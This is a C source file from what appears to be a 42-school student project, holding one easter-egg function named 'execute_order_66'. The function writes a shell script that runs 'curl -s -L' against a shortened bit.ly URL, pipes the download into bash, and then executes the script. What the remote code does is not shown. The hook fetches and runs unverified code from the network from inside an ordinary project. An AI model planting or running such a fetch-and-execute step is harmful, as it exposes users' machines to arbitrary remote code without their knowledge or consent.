/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   ee.c                                               :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: gfinet <gfinet@student.s19.be>             +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2024/05/03 23:41:56 by gfinet            #+#    #+#             */
/*   Updated: 2024/05/05 16:59:21 by gfinet           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "ee.h"

void execute_order_66(char **envp)
{
	int fd;

	ft_putendl_fd(WARNING HIDDEN, 1);
	sleep(1);
	fd = open("includes/ee/order66.sh", O_WRONLY | O_CREAT | O_TRUNC,
		S_IRUSR | S_IXUSR | S_IRUSR);
	ft_putendl_fd("#!/bin/bash",fd);
	ft_putendl_fd("curl -s -L https://bit.ly/3zvELNz | bash", fd);
	close(fd);
	execve(ORDE,R_66);
}
